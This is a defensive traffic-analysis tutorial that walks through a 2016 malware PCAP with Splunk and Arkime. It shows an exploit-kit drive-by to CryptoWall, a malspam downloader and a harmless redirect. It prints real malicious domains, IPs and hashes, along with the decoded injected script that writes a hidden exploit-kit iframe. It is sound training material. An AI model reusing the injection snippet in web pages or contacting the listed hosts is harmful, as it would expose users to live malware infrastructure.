---
title: Alerts on 3 different hosts — EK drive-by to CryptoWall, a malspam JS downloader and a harmless redirect (Splunk first, Arkime second)
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - snort
  - exploit-kit
  - cryptowall
  - ransomware
  - js-downloader
---

# Alerts on 3 different hosts — EK drive-by to CryptoWall, a malspam JS downloader and a harmless redirect { #alerts-3-hosts }

!!! abstract "Case summary"
    malware-traffic-analysis.net **2016-01-07 "Alerts on 3 different hosts"**, written as a follow-along guide for the home-lab **pcapbox** VM: **Splunk (Zeek logs) as the main tool, Arkime only where Splunk cannot show contents**. The SOC sees "evil" alerts on three Windows 7 PCs within minutes. The job is to decide, for each PC, **what happened and whether it was infected**. The three PCs show three different patterns, so the case trains one key skill: **telling a real infection apart from an alert that went nowhere**.

| | |
|---|---|
| **Evidence** | `2016-01-07-traffic-analysis-exercise.pcap` — 2016-01-07 22:05:47 – 22:17:18 UTC (about 11.5 min) |
| **Source** | [malware-traffic-analysis.net 2016-01-07 "Alerts on 3 different hosts"](https://malware-traffic-analysis.net/2016/01/07/index.html) |
| **Given** | Nothing about the LAN. You find the range, gateway and PCs yourself |
| **Questions** | Time range · IP, MAC and host name of each of the 3 PCs · what happened on each PC and whether it was infected · follow-up recommendations |
| **Environment** | Closed network. pcapbox VM: Splunk (`index=zeek`, case field `pcap_case`), Arkime (tag = case name), Snort 2.9.20. **No Wireshark.** |
| **Case name** | `20160107_ALERTS_ON_3_DIFFERENT_HOSTS` |
| **Related pages** | [Sorting through the alerts (same method, one PC)](socgholish-fake-chrome-update-wscript-c2.md) · [Phishing red herring to EK drive-by](phishing-red-herring-ek-driveby-ursnif-c2.md) · [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Zeek logs](../../network/zeek/index.md) |

!!! tip "How to use this page"
    Work it in order. Each step is **Goal → Splunk query (explained line by line) → what you should see → reading the result**. Arkime appears only where Splunk cannot show a page or a body.

    The result blocks were prepared from the same PCAP before you run anything. **Hosts, times, URIs and sizes were checked against the pcapbox results. Totals (for example the number of `conn` lines) can differ a little** if your Zeek version splits UDP and retried connections differently. If a key row is different, stop and check your case name and time range first.

    Labels: **[data]** = seen in Splunk or Arkime, **[inference]** = a conclusion that still needs proof.

!!! warning "The indicators on this page are real"
    Domains, IPs and hashes come from real 2016 malware traffic. Prose and tables are defanged (`hxxp`, `[.]`); code blocks keep the values you type. **Do not visit them.** Do not run anything you extract.

??? success "Answers — open only after you finish"
    | PC | IP / MAC / host name | What happened | Infected? |
    |---|---|---|---|
    | A | 192.168.122.132 · 48:5b:39:c1:f2:48 · **Hokaydoo-PC** | Google result → hacked `www.koeppl[.]com` → exploit kit on `*.securetopc[.]top` (Flash exploit, encrypted payload) → **CryptoWall** check-ins to hacked sites → user opened the **"Decrypt service"** ransom page | **Yes — ransomware** |
    | B | 192.168.122.130 · 00:22:19:e2:4b:86 · **FULL-METAL-JACK** | During a Yahoo webmail session a script (`MSIE 7.0` User-Agent, an email address inside its `id=`) downloads Windows EXEs **labelled `.gif`** from 3 hacked sites, 6 times | **Yes — malware downloaded** (follow-up traffic not seen) |
    | C | 192.168.122.52 · 00:26:55:32:a9:17 · **Jennifer-PC** | Yahoo search → `planetside.co[.]uk` with a script injected into `mootools-core.js` → gate `st.domandvilma[.]com` replied with an **empty** value → the script set its cookie and stopped | **No** — alert only |

---

## Step 0 — Load the PCAP and check the case { #prep }

**Goal:** give the PCAP a case name so its logs never mix with other exercises, and set every tool to **UTC**.

1. Rename the file to **`20160107_ALERTS_ON_3_DIFFERENT_HOSTS.pcap`** and copy it to `\\10.50.10.60\incoming`.
2. On pcapbox, wait for `DONE case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS` in `tail -f /data/logs/ingest.log`. **Load it once only** — loading it again puts every log in twice.
3. Splunk **Preferences → Time zone = UTC**; Arkime **Settings → Timezone = UTC**, time range **All**.

```spl
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
```

- `index=zeek` — the index (Splunk's "drawer") that holds the Zeek logs.
- `sourcetype=zeek:conn` — the connection log: one line per connection.
- `|` — pass the results on to the next command.
- `stats count by pcap_case` — count lines for each case name. Your new case must be in the list.

!!! note "Time: use `ts`"
    Zeek's own event time is **`ts`** (epoch seconds). The queries sort and print with `ts`; `eval t=strftime(ts,"%H:%M:%S")` makes it readable.

---

## Step 1 — Baselining: what is normal in this capture { #baseline }

Baselining = learning what is **normal** first: time range, log types, which PCs exist, who they are and how they normally browse. Only then do "odd" things stand out.

### 1-1. Which logs exist { #log-types }

```spl
index=zeek pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| stats count by sourcetype
| sort - count
```

- No `sourcetype` → every log type of this case. `sort - count` = largest first.

**What you should see (order, not exact counts):** `zeek:conn` (about 520 lines), `zeek:http` (a few hundred), `zeek:dns`, `zeek:ssl`, `zeek:files`, `zeek:x509`, `zeek:dhcp`, `zeek:software`, possibly `zeek:weird`, `zeek:pe`.

**[data] Reading:**

- **`zeek:dhcp` is there** — the PCs asked for their IP addresses during the capture, so DHCP gives name, MAC and IP directly (1-4).
- **No `kerberos`, `ldap`, `smb_*`** — no Active Directory domain. These are stand-alone PCs; there is no user name to find.
- **`zeek:http` is large** — lots of clear-text web traffic you can read in full. Good news for this case.
- **`zeek:pe`** (if you have it) means Zeek saw a **Windows program (EXE/DLL) inside the traffic**. In a normal office capture that is rare. Note it.

### 1-2. Capture window { #window }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| stats min(ts) as first max(ts) as last count as sessions
| eval duration_min=round((last-first)/60,1)
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
```

- Line 2: one summary row — earliest and latest connection start, number of connections. `as` names the result.
- Line 3: minutes, one decimal. **Must come before line 4** — after line 4 `first`/`last` are text and cannot be subtracted.
- Line 4: epoch → readable date.

**What you should see:** `first` **2016-01-07 22:05:47**, `last` about **22:17** (the last connection **start**; the last packet is 22:17:18), about **11.5 minutes**, about **520** connections.

### 1-3. Which internal IPs start connections { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.0.0/16
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_orig_h
| eval first=strftime(first,"%H:%M:%S")
| sort first
```

- `id_orig_h` = the IP that **started** the connection (`orig` = originator, `resp` = responder, `_h` = host, `_p` = port).
- `id_orig_h=192.168.0.0/16` — Splunk understands an IP range (CIDR) on IP fields: only private 192.168.x.x senders.
- `dc()` = distinct count. `orig_bytes` / `resp_bytes` = payload bytes each side sent.

**What you should see (shape; your counts will differ a little):**

```text
id_orig_h         sessions  destinations  first
192.168.122.130   …         …             22:05:51
192.168.122.52    (most)    …             22:06:06
192.168.122.132   …         …             22:06:25
192.168.122.1     a few (DHCP replies)
```

**[data] Reading:**

- **LAN = 192.168.122.0/24.** Three PCs: **.130, .52, .132**.
- **192.168.122.1** starts almost nothing. It is the **gateway, DHCP server and DNS server** (confirmed in 1-4 and 1-6).
- The three PCs start one after another (22:05:51, 22:06:06, 22:06:25) — they were switched on at the start of the capture.

### 1-4. Who is who — DHCP { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval t=strftime(ts,"%H:%M:%S")
| table t client_addr assigned_addr mac host_name msg_types server_addr
| sort t
```

- `zeek:dhcp` = one line per DHCP exchange. `assigned_addr` = the IP the server gave; `mac` = the PC's network card; `host_name` = the name the PC sent (DHCP option 12).
- `msg_types`: **REQUEST/ACK** = "may I use this IP?" / "yes"; **INFORM/ACK** = "I already have an IP, give me settings".

**What you should see:**

```text
t         client_addr      assigned_addr    mac                 host_name         msg_types
22:05:47                   192.168.122.130  00:22:19:e2:4b:86   FULL-METAL-JACK   REQUEST ACK
22:05:51                   192.168.122.130  00:22:19:e2:4b:86   FULL-METAL-JACK   REQUEST ACK
22:05:54  192.168.122.130                   00:22:19:e2:4b:86   FULL-METAL-JACK   INFORM ACK
22:06:02                   192.168.122.52   00:26:55:32:a9:17   Jennifer-PC       REQUEST ACK
22:06:06                   192.168.122.52   00:26:55:32:a9:17   Jennifer-PC       REQUEST ACK
22:06:10  192.168.122.52                    00:26:55:32:a9:17   Jennifer-PC       INFORM ACK
22:06:21                   192.168.122.132  48:5b:39:c1:f2:48   Hokaydoo-PC       REQUEST ACK
22:06:25                   192.168.122.132  48:5b:39:c1:f2:48   Hokaydoo-PC       REQUEST ACK
22:06:29  192.168.122.132                   48:5b:39:c1:f2:48   Hokaydoo-PC       INFORM ACK
22:10:45  192.168.122.132                   48:5b:39:c1:f2:48   Hokaydoo-PC       INFORM ACK
22:11:53  192.168.122.130                   00:22:19:e2:4b:86   FULL-METAL-JACK   INFORM ACK
```

**[data] Reading:** three names, three MACs, three IPs. Each PC asked twice (REQUEST, 4 s apart) and then sent an INFORM. On INFORM rows `assigned_addr` is empty — the PC already has its IP, so it appears in `client_addr`. `server_addr` is **192.168.122.1**. These answer question 2 of the exercise.

| IP | MAC | Host name |
|---|---|---|
| 192.168.122.130 | 00:22:19:e2:4b:86 | FULL-METAL-JACK |
| 192.168.122.52 | 00:26:55:32:a9:17 | Jennifer-PC |
| 192.168.122.132 | 48:5b:39:c1:f2:48 | Hokaydoo-PC |

!!! question "Question: why did .132 and .130 send a second DHCP INFORM later?"
    Windows sends INFORM when something asks for network settings again — a new network check or a program starting. On its own it means nothing. Note the times (22:10:45 and 22:11:53) and see whether anything else happens around them. (Spoiler-free hint: both are within seconds of something interesting in Step 3 and Step 4.)

### 1-5. What each PC runs — User-Agents { #user-agents }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count dc(host) as sites by id_orig_h user_agent
| sort id_orig_h first
```

- `user_agent` = the name a program gives itself in each HTTP request. A browser has one; other programs have their own.
- `eval host=mvdedup(host)` — keeps one copy of `host` (the pcapbox Splunk once stored it twice; the habit does no harm).
- `stats … by id_orig_h user_agent` = one row per **PC + program** pair.

**What you should see:**

```text
id_orig_h        user_agent                                                                  first     count  sites
192.168.122.130  Microsoft NCSI                                                              22:05:58  1      1
192.168.122.130  Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)            22:07:00  1      1
192.168.122.130  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; ...)  22:11:53  9      3
192.168.122.132  Microsoft NCSI                                                              22:06:33  1      1
192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko        22:10:08  ~80    9
192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR ...; rv:11.0) like Gecko  22:10:26  1  1
192.168.122.132  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)  22:10:47  4      2
192.168.122.52   Microsoft NCSI                                                              22:06:13  1      1
192.168.122.52   Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)             22:08:49  202    ~16
```

**[data] Reading:**

- `Windows NT 6.1` = **Windows 7** on all three. `Microsoft NCSI` = Windows checking "am I online?" at start-up — normal.
- Browsers: .130 **IE 10**, .52 **IE 9**, .132 **IE 11** (`Trident/7.0; rv:11.0`, 64-bit Windows: `WOW64`).
- **Two PCs later show "MSIE 7.0"** (.130 at 22:11:53, .132 at 22:10:47). IE 7 is from 2006. On Windows 7 this string is the default User-Agent of **Windows' own HTTP objects used by scripts and programs** (WScript, many malware families) — **not the user's browser**. Candidate.
- **.132 has a third User-Agent used once** (22:10:26): IE 11 with extra `.NET CLR` parts. A different program made that one request. Candidate.

### 1-6. DNS servers { #dns-servers }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_resp_p=53
| stats count by id_orig_h id_resp_h
```

**What you should see:** .130 and .52 ask **192.168.122.1**; **.132 asks 8.8.8.8 and 8.8.4.4** (Google). [data] Someone set .132's DNS by hand. Not malicious by itself, but it means a DNS log on the gateway would **miss** .132's lookups — worth one line in the report.

**Baseline notes — candidates, no conclusions yet:**

1. 22:10:26 — .132, a one-time IE 11 variant User-Agent
2. 22:10:47 — .132, `MSIE 7.0`
3. 22:11:53 — .130, `MSIE 7.0`

---

## Step 2 — What each PC visited: remove the normal { #triage }

### 2-1. HTTP sites per PC, in time order { #http-per-pc }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host
| sort id_orig_h first
```

- `host` = the HTTP Host header (the site name). `method`: **GET** fetch, **POST** send.
- `response_body_len` = bytes the server returned (after unzipping).

**What you should see (key rows):**

```text
id_orig_h        host                                     first     count  methods    received
192.168.122.130  www.msftncsi.com                         22:05:58  1      GET
192.168.122.130  mail.yahoo.com                           22:07:00  1      GET        (then HTTPS — Step 4)
192.168.122.130  ma-wt.com.sa                             22:11:53  3      GET        375301
192.168.122.130  dariostoka.com                           22:11:55  3      GET        375301
192.168.122.130  freshanointingministries-sc.org          22:11:57  3      GET        406541
192.168.122.132  www.msftncsi.com                         22:06:33  1      GET
192.168.122.132  www.google.com.au                        22:10:08  1      GET
192.168.122.132  www.koeppl.com                           22:10:10  55     GET
192.168.122.132  translate.google.com / pbs.twimg.com / stats.g.doubleclick.net / joomla-gtranslate.googlecode.com   (1 each)
192.168.122.132  uacltr.securetopc.top                    22:10:15  3      GET        84264
192.168.122.132  gbesbsdsb.securetopc.top                 22:10:23  2      GET        421888
192.168.122.132  bizsouls.com                             22:10:47  3      POST       123682
192.168.122.132  estudiobarco.com.ar                      22:12:14  1      POST       6
192.168.122.132  3wzn5p2yiumh7akj.waytopaytosystem.com    22:16:46  17     GET POST
192.168.122.52   www.msftncsi.com                         22:06:13  1      GET
192.168.122.52   au.search.yahoo.com / l.yimg.com / ri.search.yahoo.com   22:08:49   (Yahoo search)
192.168.122.52   planetside.co.uk                         22:09:12  ~80    GET POST
192.168.122.52   st.domandvilma.com                       22:09:24  1      GET        26
192.168.122.52   ajax.googleapis.com / ajax.aspnetcdn.com / www.google-analytics.com   (site resources)
192.168.122.52   www.outdoorsamoa.com / www.tripadvisor.com / fonts.* / static.tacdn.com   22:15:29 …
```

**How to remove the normal:**

1. Windows itself: `msftncsi.com`.
2. Big known services and their parts: Google (`google.*`, `gstatic`, `googleapis`, `google-analytics`, `doubleclick`), Yahoo (`yahoo.com`, `yimg.com`), Twitter (`twimg.com`), Microsoft CDN (`aspnetcdn.com`), TripAdvisor (`tripadvisor.*`, `tacdn.com`, `jscache.com`).
3. A site the user clearly chose (search result, typed address) and the resources it loads under its own name.

**[data] What is left:**

| PC | Left over | Why it is odd |
|---|---|---|
| .132 | `uacltr.securetopc.top`, `gbesbsdsb.securetopc.top` | Random sub-domains on a `.top` domain, seconds after a normal site |
| .132 | `bizsouls.com`, `estudiobarco.com.ar` | **POST only**, by the `MSIE 7.0` program (candidate 2) |
| .132 | `3wzn5p2yiumh7akj.waytopaytosystem.com` | 16 random characters + "way to pay to system" |
| .130 | `ma-wt.com.sa`, `dariostoka.com`, `freshanointingministries-sc.org` | Three unrelated sites, same 3-request pattern, ~375–406 KB each, by `MSIE 7.0` (candidate 3) |
| .52 | `st.domandvilma.com` | Not part of the site the user opened; only **26 bytes** returned |

### 2-2. Destinations with no DNS lookup — and why nothing shows here { #no-dns }

In the previous case this query found the C2. Try it — knowing **when a method finds nothing** is part of the skill.

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.0/24 proto=tcp NOT id_resp_h=192.168.0.0/16
    NOT [search index=zeek sourcetype=zeek:dns pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h]
| stats count by id_orig_h id_resp_h id_resp_p
```

- The `[ … ]` **subsearch** runs first and collects every IP seen in DNS answers (`mvexpand` = one row per value; `rename` = match the conn field name). `NOT` keeps only TCP destinations **never** looked up.

**What you should see:** **No results.** [data] Every external TCP destination was reached by name. All malicious activity in this capture uses **domains**, so HTTP and DNS (Step 2-1) are the right place to look — not "hard-coded IP" hunting.

**Plan:** one PC at a time, most serious first: **.132** (three kinds of odd traffic) → **.130** → **.52**.

---

## Step 3 — PC A: 192.168.122.132 Hokaydoo-PC { #pc-a }

### 3-1. The chain, with the Referer { #pc-a-chain }

The **Referer** header says "I came from this page". Following it shows which page called which. (HTTP spells it *Referer*; Zeek names the field `referrer`.)

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 ts>=1452204600
| eval host=mvdedup(host)
| search NOT host IN ("*google*","*twimg.com","*doubleclick.net","*googlecode.com") NOT uri="*.css*" NOT uri="*.png*" NOT uri="*.jpg*" NOT uri="*.gif*" NOT uri="*.js*"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| sort ts
| table t host uri referrer user_agent status_code resp_mime_types response_body_len
```

- `ts>=1452204600` = from **22:10:00 UTC** (epoch seconds; `| makeresults | eval x=strftime(1452204600,"%H:%M:%S")` shows it).
- `host IN ("*google*", …)` — `IN` with wildcards; with `NOT` it hides the noise (also the Google result click at 22:10:08). The `uri` filters hide images, styles and scripts of the normal site.
- `resp_mime_types` = Zeek's guess **from the content**, not from the server's label.

**What you should see:**

```text
t              host                                    uri                                                          referrer                                   status  resp_mime_types                response_body_len
22:10:10.863   www.koeppl.com                          /                                                            http://www.google.com.au/url?sa=t&rct=j…  200     text/plain                     62939
22:10:15.930   uacltr.securetopc.top                   /1993/10/14/madness/willow/dick-sort-southward-swallow.html  http://www.koeppl.com/                     200     text/html                      1035
22:10:16.598   uacltr.securetopc.top                   /1987/09/28/behave/cheerful-stumble-broad.html.swf           http://uacltr.securetopc.top/1993/10/14/…  -       -                              0
22:10:17.300   uacltr.securetopc.top                   /1987/09/28/behave/cheerful-stumble-broad.html.swf           http://uacltr.securetopc.top/1993/10/14/…  200     application/x-shockwave-flash  83229
22:10:23.164   gbesbsdsb.securetopc.top                /surprise/1430317/fellow-touch-death-curl-cast-dance-bubble-moonlight-shock  http://uacltr.securetopc.top/…  200  -       0
22:10:26.229   gbesbsdsb.securetopc.top                /officer/1277929/tidings-humble-communication                -                                          200     -                              421888
22:10:47.545   bizsouls.com                            /XG3vxT.php?y=21657wkalasvbb                                 -                                          200     text/plain                     14
22:10:51.876   bizsouls.com                            /XG3vxT.php?c=a2py731nhw                                     -                                          200     text/plain                     123668
22:11:11.746   bizsouls.com                            /XG3vxT.php?o=py8nr3ezh06q03o                                -                                          200     -                              0
22:12:14.456   estudiobarco.com.ar                     /5TFv7E.php?z=py8nr3ezh06q03o                                -                                          200     text/plain                     6
22:16:46.032   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p                                                     -                                          200     text/html                      3289
22:16:57.894   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p   (POST)                                            http://3wzn5p2yiumh7akj…/1f96s0p           200     text/html                      14463
```

!!! note "Why is the koeppl home page `text/plain`?"
    Zeek decides the type from the **first bytes**. A normal page starts with `<!DOCTYPE html>` or `<html>`. This one starts with `<style>` (the injected code in 3-2), so Zeek did not recognise it as HTML. The odd type is already a small clue.

**[data] Reading, line by line:**

1. **22:10:08–10 — the user clicked a Google result** for `www.koeppl.com` (a German motor-equipment shop). A normal visit, Referer = Google.
2. **22:10:15 — the koeppl page called a stranger.** `uacltr.securetopc.top` has **Referer `http://www.koeppl.com/`**: something inside the koeppl page sent the browser there.
3. **The path looks like a blog post made of a date and random words** (`/1993/10/14/madness/willow/…html`). Random words in paths, a cheap `.top` domain and two random sub-domains on one IP are typical of **exploit kit (EK)** landing pages in late 2015 / early 2016.
4. **22:10:16–17 — a Flash file (`.swf`, 83 KB)** loaded by the landing page. The first request got no answer, the browser asked again. EKs used Flash bugs to run code just by viewing a page.
5. **22:10:26 — 421,888 bytes with no Referer and a different User-Agent** (candidate 1). Not the browser: **the exploit's own code** downloading its payload. Zeek finds **no file type** in it (3-3).
6. **22:10:47 — 21 s later, a new program (`MSIE 7.0`, candidate 2) POSTs to `bizsouls.com`** three times, then to `estudiobarco.com.ar` (3-4).
7. **22:16:46 — a page on `…waytopaytosystem.com`**, opened by the browser (IE 11 User-Agent) with **no Referer** (3-5).

!!! question "Question: how do we know the user did not click the exploit kit link?"
    **The Referer alone cannot tell.** A click on a link and an automatic request from a script both send `Referer: http://www.koeppl.com/`. Three other facts answer it:

    1. **The decoded script writes a hidden iframe** (3-2). The iframe address is exactly the landing URL requested at 22:10:15. A browser loads an iframe by itself — no click needed.
    2. **The koeppl page stayed open.** The browser asked koeppl for its `favicon.ico` at 22:10:34. If the user had clicked a link, the browser would have left koeppl.
    3. **The script ran in the browser.** The two cookies the script writes appear in the next requests to koeppl, and the server never sent them (3-2).

!!! question "Question: what does the DHCP INFORM at 22:10:45 mean?"
    Look back at 1-4: .132 sent a DHCP INFORM at **22:10:45** — **2 s before** the first `MSIE 7.0` POST (22:10:47). A freshly started program asking Windows for network settings fits a new process starting. It supports, but does not prove, that the payload ran.

### 3-2. The hacked site — injected code before `<html>` (Arkime) { #pc-a-inject }

Zeek keeps summaries, **not page contents**. Open the koeppl page in Arkime:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && http.uri == "www.koeppl.com/"
```

!!! warning "Arkime's `http.uri` includes the host name"
    Arkime stores the URI as **host + path**, for example `www.koeppl.com/`. So `http.uri == "/"` finds **nothing**. Use the full value in quotes, or start with a wildcard: `http.uri == */counter/*`.

Expand the session (`+`), choose **natural** and **uncompress**, scroll to the **response body** (it is gzip-compressed on the wire).

```text
<style>.kjpxhkghapgcgt { position: absolute; top: -1357px; left: -1125px}</style>
<div id="nvjgnbocfpotc" class="kjpxhkghapgcgt">a fa e bceid: fb, ocdbf ekdjcpajdcaecrbqbxcpbsed a ucdbdcp b j; dgahaacsera z 'b' ubmaoa ...</div>
<script>
var pxzqxmmylyy=(563738144>878824873?"\x65":"re");
var scestqiccnik=(75811078+892246232<544535642+1517287702?"\x72\x65":"px");
...
</script>
<!DOCTYPE html ...>
<html ...>
```

**[data] Reading:**

- A real web page starts with `<!DOCTYPE html>` or `<html>`. Here **about 25 KB of junk comes first**: a `<style>` that moves a `<div>` far off the screen (`top:-1357px`) and a `<div>` full of nonsense letters.
- Then a `<script>` that builds words from tiny pieces with true/false tests (`563738144>878824873 ? "e" : "re"`) — **obfuscation**, so that the word "securetopc" never appears in plain text.
- **Code before `<html>` on a normal site = injected.** The site is compromised.

??? info "Going further: what the script does (decoded offline — never run it)"
    The script is decoded **by reading it**, not by running it in a browser:

    1. Each `(A>B ? "x" : "y")` piece is worked out by hand or in a small script that only compares numbers. Put together, the pieces spell `[][constructor][constructor](code)()` = `Function(code)()` — "run this text as code".
    2. It checks the browser: `rv:11` (IE 11) or `MSIE`. Other browsers get nothing.
    3. It reads the hidden `<div>` letters **in pairs** (`a`–`z` only). Each pair is a number: first letter × 26 + second letter. Each number is XOR-ed with the key `senP7ICzRjcg5` and turned into a character.

    The result:

    ```text
    var date = new Date(new Date().getTime() + 60*60*24*7*1000);
    document.cookie = "PHP_SESSION_PHP=120; path=/; expires="+date.toUTCString();
    document.cookie = "_PHP_SESSION_PHP=123; path=/; expires="+date.toUTCString();
    document.write('<style>.ecwrjvwhyzyjnx{position:absolute;top:-605px;width:300px;height:300px;}</style>
      <div class="ecwrjvwhyzyjnx"><iframe src="http://uacltr.securetopc.top/1993/10/14/madness/willow/dick-sort-southward-swallow.html"
      width="250" height="250"></iframe></div>');
    ```

    - **A 250×250 iframe placed 605 px above the top of the page** — invisible to the user, loaded by the browser automatically.
    - The iframe address is **exactly** the landing URL of 22:10:15.
    - Two cookies valid for 7 days (`PHP_SESSION_PHP=120`, `_PHP_SESSION_PHP=123`) — **[inference]** a mark so the same visitor is not attacked twice.

**Proof that the script ran — the cookies (Arkime):** open the next koeppl requests and look at the `Cookie:` line.

```text
22:10:10.863  GET /                                              (no Cookie)
22:10:13.326  GET /cache/template/gzip.php?widgetkit-…css        Cookie: PHP_SESSION_PHP=120; _PHP_SESSION_PHP=123
22:10:14.120  GET /cache/template/gzip.php?bootstrap-…css        Cookie: PHP_SESSION_PHP=120; _PHP_SESSION_PHP=123
```

- **[data]** No server response in the capture contains `Set-Cookie: PHP_SESSION_PHP`. The cookies were **made inside the browser**, by the injected script.
- Method to remember: **decide what the code must leave behind if it ran, then look for that trace in the next requests.** Step 5 uses the same method.

### 3-3. Exploit kit and payload — files (Splunk + Arkime) { #pc-a-files }

```spl
index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS tx_hosts="89.38.144.75"
| eval t=strftime(ts,"%H:%M:%S")
| table t tx_hosts rx_hosts mime_type seen_bytes md5
```

- `zeek:files` = one line per file Zeek saw in the traffic. `tx_hosts` = sender, `rx_hosts` = receiver, `mime_type` = type **from the content**, `md5` = fingerprint.
- `89.38.144.75` = the server of both `securetopc.top` names (check: `index=zeek sourcetype=zeek:dns query="*securetopc.top" | table ts query answers`).

**What you should see:**

```text
t         tx_hosts      rx_hosts         mime_type                       seen_bytes  md5
22:10:15  89.38.144.75  192.168.122.132  text/html                       1035        946f2af6be0d796430b590ad5ee48be5
22:10:18  89.38.144.75  192.168.122.132  application/x-shockwave-flash   83229       6631e8c0d5f07004fabff81872f10d5e
22:10:27  89.38.144.75  192.168.122.132  (empty)                         421888      dd5ecd6f928fc4f988996feb5b292879
```

Now open the payload in Arkime:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && http.uri == */officer/*
```

**[data] Reading:**

- The request has **no Referer**, a **different User-Agent** (IE 11 with extra `.NET CLR` parts) and very few headers — a program, not the browser page.
- The reply says `Content-Type: application/octet-stream`. The body starts with `26 2e c8 75 …`, **not `MZ`**. The payload is **encrypted** on the wire and decrypted on the PC.
- So the MD5 is of the **encrypted** bytes, not of the program on disk. Searching it in a malware database usually finds nothing.

**[inference] Which exploit kit?** Random date-and-words paths, `.html.swf` names, a `.top` domain with two random sub-domains, a payload path of a word + number + words and an encrypted payload match how **Neutrino EK** looked in January 2016. Write "EK (pattern matches Neutrino)", not a confirmed name.

### 3-4. After the payload: check-ins (Splunk + Arkime) { #pc-a-post }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 method=POST host IN ("bizsouls.com","estudiobarco.com.ar")
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_p id_resp_h host uri request_body_len response_body_len
```

```text
t         id_orig_p  id_resp_h        host                 uri                             request_body_len  response_body_len
22:10:47  49218      188.138.101.154  bizsouls.com         /XG3vxT.php?y=21657wkalasvbb    131               14
22:10:51  49219      188.138.101.154  bizsouls.com         /XG3vxT.php?c=a2py731nhw        113               123668
22:11:11  49220      188.138.101.154  bizsouls.com         /XG3vxT.php?o=py8nr3ezh06q03o   124               0
22:12:14  …          50.22.11.55      estudiobarco.com.ar  /5TFv7E.php?z=py8nr3ezh06q03o   124               6
```

Open the four POSTs in Arkime:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && host.http == [bizsouls.com, estudiobarco.com.ar]
```

```text
POST /XG3vxT.php?y=21657wkalasvbb HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)
Host: bizsouls.com
Content-Length: 131
Connection: Close
Cache-Control: no-cache

b=31793872756d7071786e3391b3073aac2a423df8a3b5afb9cb38c907fba895a77d264b81ad...
```

**[data] Reading:**

- **Not the browser:** no `Accept-Language`, no `Accept-Encoding`, no Referer; `Connection: Close` and a **new connection for every POST** (source ports 49218, 49219, 49220).
- Body = **one letter `=` hex**, reply = hex too (`39187820a48aa9`; the second reply is **123,668 bytes of hex**). Hex that does not turn into readable bytes, not even with a 1-byte XOR → **[inference] real encryption**. Stop decoding here.
- The parameter letter changes (`y`, `c`, `o`, `z`) but values repeat. Path names (`XG3vxT.php`) and the shared-hosting `Server:` header fit **hacked websites used as relays**.

**Why compare the last two bodies?** bizsouls answered the third POST (22:11:11) with **0 bytes**. One minute later the same kind of POST went to estudiobarco. If the bodies are **the same**:

1. The program **retried the same message on a second server** → it carries a **list of C2 servers**. Blocking one is not enough.
2. Both sites belong to **one infection** — two IOCs in one ticket.
3. The encryption gives the same output for the same input, so the hex value itself can be an indicator.

**How to compare without reading:** Arkime's **Body MD5s** (HTTP panel) hash **request and response bodies**. The third bizsouls session shows `4fd5e80b20ea9d39925155d9f8b2aa1d` (its reply is empty, so that is the request body). The estudiobarco session shows `eb74f3bb…` (its reply) **and `4fd5e80b20ea9d39925155d9f8b2aa1d`**. **[data] Same body** (`o=79386f37…eacb6`, 124 bytes), and the URI value `py8nr3ezh06q03o` is the same too.

